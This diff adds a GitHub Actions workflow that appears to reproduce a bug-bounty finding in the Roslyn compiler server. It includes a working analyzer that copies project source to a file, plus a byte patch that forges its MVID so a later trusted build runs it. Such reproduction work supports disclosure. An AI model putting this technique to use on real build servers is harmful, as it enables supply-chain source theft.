@@ -1,0 +1,240 @@
+name: roslyn-disabled-cross-project-mvid-lab
+
+on:
+  push:
+    branches:
+      - dotnet-bounty-lab-20260921
+    paths:
+      - .github/workflows/roslyn-disabled-cross-project-mvid-lab.yml
+
+permissions:
+  contents: read
+
+jobs:
+  reproduce:
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+    steps:
+      - uses: actions/checkout@v4
+
+      - uses: actions/setup-dotnet@v4
+        with:
+          dotnet-version: '10.0.x'
+
+      - name: Build analyzer fixtures and patch attacker MVID
+        shell: bash
+        run: |
+          set -euo pipefail
+          rm -rf /tmp/roslyn-cross-project /tmp/CROSS_PROJECT_MARKER
+          mkdir -p /tmp/roslyn-cross-project/{trusted-analyzer,malicious-analyzer,reader,shared,poison-project,trusted-project}
+
+          cat > /tmp/roslyn-cross-project/trusted-analyzer/CollisionAnalyzer.csproj <<'EOF'
+          <Project Sdk="Microsoft.NET.Sdk">
+            <PropertyGroup>
+              <TargetFramework>net10.0</TargetFramework>
+              <AssemblyName>CollisionAnalyzer</AssemblyName>
+              <Deterministic>true</Deterministic>
+              <DebugType>none</DebugType>
+            </PropertyGroup>
+            <ItemGroup>
+              <Reference Include="Microsoft.CodeAnalysis" HintPath="$(MSBuildSDKsPath)/../Roslyn/bincore/Microsoft.CodeAnalysis.dll" Private="false" />
+            </ItemGroup>
+          </Project>
+          EOF
+          cp /tmp/roslyn-cross-project/trusted-analyzer/CollisionAnalyzer.csproj /tmp/roslyn-cross-project/malicious-analyzer/CollisionAnalyzer.csproj
+
+          cat > /tmp/roslyn-cross-project/trusted-analyzer/CollisionAnalyzer.cs <<'EOF'
+          using System.Collections.Immutable;
+          using Microsoft.CodeAnalysis;
+          using Microsoft.CodeAnalysis.Diagnostics;
+
+          [DiagnosticAnalyzer(LanguageNames.CSharp)]
+          public sealed class CollisionAnalyzer : DiagnosticAnalyzer
+          {
+              private static readonly DiagnosticDescriptor Rule =
+                  new("LAB002", "Lab", "Trusted analyzer executed", "Lab", DiagnosticSeverity.Warning, true);
+              public override ImmutableArray<DiagnosticDescriptor> SupportedDiagnostics => ImmutableArray.Create(Rule);
+              public override void Initialize(AnalysisContext context)
+              {
+                  context.EnableConcurrentExecution();
+                  context.RegisterCompilationAction(static ctx =>
+                      ctx.ReportDiagnostic(Diagnostic.Create(Rule, Location.None)));
+              }
+          }
+          EOF
+
+          cat > /tmp/roslyn-cross-project/malicious-analyzer/CollisionAnalyzer.cs <<'EOF'
+          using System.Collections.Immutable;
+          using System.IO;
+          using System.Linq;
+          using Microsoft.CodeAnalysis;
+          using Microsoft.CodeAnalysis.Diagnostics;
+
+          [DiagnosticAnalyzer(LanguageNames.CSharp)]
+          public sealed class CollisionAnalyzer : DiagnosticAnalyzer
+          {
+              private static readonly DiagnosticDescriptor Rule =
+                  new("LAB002", "Lab", "Stale analyzer executed", "Lab", DiagnosticSeverity.Warning, true);
+              public override ImmutableArray<DiagnosticDescriptor> SupportedDiagnostics => ImmutableArray.Create(Rule);
+              public override void Initialize(AnalysisContext context)
+              {
+                  context.EnableConcurrentExecution();
+                  context.RegisterCompilationAction(static ctx =>
+                  {
+                      var combinedSource = string.Join("\n---TREE---\n",
+                          ctx.Compilation.SyntaxTrees.Select(t => t.GetText().ToString()));
+                      File.AppendAllText("/tmp/CROSS_PROJECT_MARKER",
+                          "STALE_ANALYZER_PROJECT=" + ctx.Compilation.AssemblyName + "\n" + combinedSource + "\n");
+                      ctx.ReportDiagnostic(Diagnostic.Create(Rule, Location.None));
+                  });
+              }
+          }
+          EOF
+
+          cat > /tmp/roslyn-cross-project/reader/MvidReader.csproj <<'EOF'
+          <Project Sdk="Microsoft.NET.Sdk">
+            <PropertyGroup><TargetFramework>net10.0</TargetFramework><OutputType>Exe</OutputType></PropertyGroup>
+          </Project>
+          EOF
+          cat > /tmp/roslyn-cross-project/reader/Program.cs <<'EOF'
+          using System;
+          using System.IO;
+          using System.Reflection.Metadata;
+          using System.Reflection.PortableExecutable;
+          using var s = File.OpenRead(args[0]);
+          using var pe = new PEReader(s);
+          var md = pe.GetMetadataReader();
+          var mvid = md.GetGuid(md.GetModuleDefinition().Mvid);
+          Console.WriteLine(Convert.ToHexString(mvid.ToByteArray()));
+          EOF
+
+          dotnet build /tmp/roslyn-cross-project/trusted-analyzer/CollisionAnalyzer.csproj -c Release -v:q
+          dotnet build /tmp/roslyn-cross-project/malicious-analyzer/CollisionAnalyzer.csproj -c Release -v:q
+          dotnet build /tmp/roslyn-cross-project/reader/MvidReader.csproj -c Release -v:q
+
+          trusted=/tmp/roslyn-cross-project/trusted-analyzer/bin/Release/net10.0/CollisionAnalyzer.dll
+          malicious=/tmp/roslyn-cross-project/malicious-analyzer/bin/Release/net10.0/CollisionAnalyzer.dll
+          reader=/tmp/roslyn-cross-project/reader/bin/Release/net10.0/MvidReader.dll
+          cp "$malicious" /tmp/roslyn-cross-project/malicious-unpatched.dll
+          th=$(dotnet "$reader" "$trusted")
+          mh=$(dotnet "$reader" "$malicious")
+          python3 - "$malicious" "$mh" "$th" <<'PY'
+          from pathlib import Path
+          import sys
+          p=Path(sys.argv[1]); old=bytes.fromhex(sys.argv[2]); new=bytes.fromhex(sys.argv[3])
+          b=bytearray(p.read_bytes())
+          assert b.count(old)==1, b.count(old)
+          i=b.index(old); b[i:i+16]=new; p.write_bytes(b)
+          PY
+          test "$(dotnet "$reader" "$malicious")" = "$th"
+          cp "$malicious" /tmp/roslyn-cross-project/malicious-patched.dll
+          echo "TRUSTED_MVID=$th"
+          echo "PATCHED_MALICIOUS_MVID=$(dotnet "$reader" "$malicious")"
+          sha256sum "$trusted" /tmp/roslyn-cross-project/malicious-patched.dll
+
+      - name: Create poison project only
+        shell: bash
+        run: |
+          set -euo pipefail
+          cat > /tmp/roslyn-cross-project/poison-project/Poison.csproj <<'EOF'
+          <Project Sdk="Microsoft.NET.Sdk">
+            <PropertyGroup>
+              <TargetFramework>net10.0</TargetFramework>
+              <OutputType>Exe</OutputType>
+              <UseSharedCompilation>true</UseSharedCompilation>
+              <RunAnalyzers>false</RunAnalyzers>
+              <RunAnalyzersDuringBuild>false</RunAnalyzersDuringBuild>
+            </PropertyGroup>
+            <ItemGroup>
+              <Analyzer Include="/tmp/roslyn-cross-project/shared/CollisionAnalyzer.dll" />
+            </ItemGroup>
+          </Project>
+          EOF
+          echo 'System.Console.WriteLine("poison project only");' > /tmp/roslyn-cross-project/poison-project/Program.cs
+          dotnet restore /tmp/roslyn-cross-project/poison-project/Poison.csproj -v:q
+
+      - name: Control - different MVID is rejected across different projects
+        shell: bash
+        run: |
+          set -euo pipefail
+          dotnet build-server shutdown >/dev/null 2>&1 || true
+          rm -f /tmp/CROSS_PROJECT_MARKER /tmp/cross-control.log
+          cp /tmp/roslyn-cross-project/malicious-unpatched.dll /tmp/roslyn-cross-project/shared/CollisionAnalyzer.dll
+          export RoslynCommandLineLogFile=/tmp/cross-control.log
+
+          dotnet build /tmp/roslyn-cross-project/poison-project/Poison.csproj -c Release -t:Rebuild -p:UseSharedCompilation=true -p:RunAnalyzers=false -p:RunAnalyzersDuringBuild=false -v:q
+          test ! -e /tmp/CROSS_PROJECT_MARKER
+          echo "CONTROL_POISON_ANALYZER_EXECUTION=BLOCKED"
+
+          cat > /tmp/roslyn-cross-project/trusted-project/Trusted.csproj <<'EOF'
+          <Project Sdk="Microsoft.NET.Sdk">
+            <PropertyGroup>
+              <TargetFramework>net10.0</TargetFramework>
+              <OutputType>Exe</OutputType>
+              <UseSharedCompilation>true</UseSharedCompilation>
+              <RunAnalyzers>true</RunAnalyzers>
+              <RunAnalyzersDuringBuild>true</RunAnalyzersDuringBuild>
+            </PropertyGroup>
+            <ItemGroup>
+              <Analyzer Include="/tmp/roslyn-cross-project/shared/CollisionAnalyzer.dll" />
+            </ItemGroup>
+          </Project>
+          EOF
+          echo 'System.Console.WriteLine("TRUSTED_LATER_SOURCE_SENTINEL_20260921_CONTROL");' > /tmp/roslyn-cross-project/trusted-project/Program.cs
+          dotnet restore /tmp/roslyn-cross-project/trusted-project/Trusted.csproj -v:q
+          cp /tmp/roslyn-cross-project/trusted-analyzer/bin/Release/net10.0/CollisionAnalyzer.dll /tmp/roslyn-cross-project/shared/CollisionAnalyzer.dll
+
+          dotnet build /tmp/roslyn-cross-project/trusted-project/Trusted.csproj -c Release -t:Rebuild -p:UseSharedCompilation=true -v:q
+          test ! -e /tmp/CROSS_PROJECT_MARKER
+          echo "CONTROL_CROSS_PROJECT_MVID_GUARD=PASS"
+          grep -E "ID=VBCSCompiler .*Begin Analyzer Consistency|MVID|Rejected" /tmp/cross-control.log || true
+
+      - name: Attack - disabled poison project seeds same-MVID stale analyzer into later trusted project
+        shell: bash
+        run: |
+          set -euo pipefail
+          rm -rf /tmp/roslyn-cross-project/trusted-project
+          mkdir -p /tmp/roslyn-cross-project/trusted-project
+          dotnet build-server shutdown >/dev/null 2>&1 || true
+          rm -f /tmp/CROSS_PROJECT_MARKER /tmp/cross-attack.log
+          cp /tmp/roslyn-cross-project/malicious-patched.dll /tmp/roslyn-cross-project/shared/CollisionAnalyzer.dll
+          export RoslynCommandLineLogFile=/tmp/cross-attack.log
+
+          dotnet build /tmp/roslyn-cross-project/poison-project/Poison.csproj -c Release -t:Rebuild -p:UseSharedCompilation=true -p:RunAnalyzers=false -p:RunAnalyzersDuringBuild=false -v:q
+          if test -e /tmp/CROSS_PROJECT_MARKER; then
+            echo "ATTACK_POISON_STAGE_EXECUTION=UNEXPECTED"
+            exit 1
+          fi
+          echo "ATTACK_POISON_STAGE_ANALYZER_EXECUTION=BLOCKED"
+
+          cat > /tmp/roslyn-cross-project/trusted-project/Trusted.csproj <<'EOF'
+          <Project Sdk="Microsoft.NET.Sdk">
+            <PropertyGroup>
+              <TargetFramework>net10.0</TargetFramework>
+              <OutputType>Exe</OutputType>
+              <UseSharedCompilation>true</UseSharedCompilation>
+              <RunAnalyzers>true</RunAnalyzers>
+              <RunAnalyzersDuringBuild>true</RunAnalyzersDuringBuild>
+            </PropertyGroup>
+            <ItemGroup>
+              <Analyzer Include="/tmp/roslyn-cross-project/shared/CollisionAnalyzer.dll" />
+            </ItemGroup>
+          </Project>
+          EOF
+          echo 'System.Console.WriteLine("TRUSTED_LATER_SOURCE_SENTINEL_20260921_ATTACK");' > /tmp/roslyn-cross-project/trusted-project/Program.cs
+          dotnet restore /tmp/roslyn-cross-project/trusted-project/Trusted.csproj -v:q
+
+          cp /tmp/roslyn-cross-project/trusted-analyzer/bin/Release/net10.0/CollisionAnalyzer.dll /tmp/roslyn-cross-project/shared/CollisionAnalyzer.dll
+          cmp /tmp/roslyn-cross-project/trusted-analyzer/bin/Release/net10.0/CollisionAnalyzer.dll /tmp/roslyn-cross-project/shared/CollisionAnalyzer.dll
+          echo "ON_DISK_ANALYZER_BEFORE_TRUSTED_BUILD=PRISTINE_TRUSTED"
+
+          dotnet build /tmp/roslyn-cross-project/trusted-project/Trusted.csproj -c Release -t:Rebuild -p:UseSharedCompilation=true -v:q
+
+          test -e /tmp/CROSS_PROJECT_MARKER
+          grep -q "STALE_ANALYZER_PROJECT=Trusted" /tmp/CROSS_PROJECT_MARKER
+          grep -q "TRUSTED_LATER_SOURCE_SENTINEL_20260921_ATTACK" /tmp/CROSS_PROJECT_MARKER
+          echo "DISABLED_ANALYZER_CROSS_PROJECT_MVID_BYPASS=CONFIRMED"
+          echo "LATER_TRUSTED_SOURCE_READ_BY_STALE_ANALYZER=CONFIRMED"
+          cat /tmp/CROSS_PROJECT_MARKER
+          echo "SERVER_REUSE_EVIDENCE:"
+          grep -E "ID=VBCSCompiler .*Begin Analyzer Consistency" /tmp/cross-attack.log || true
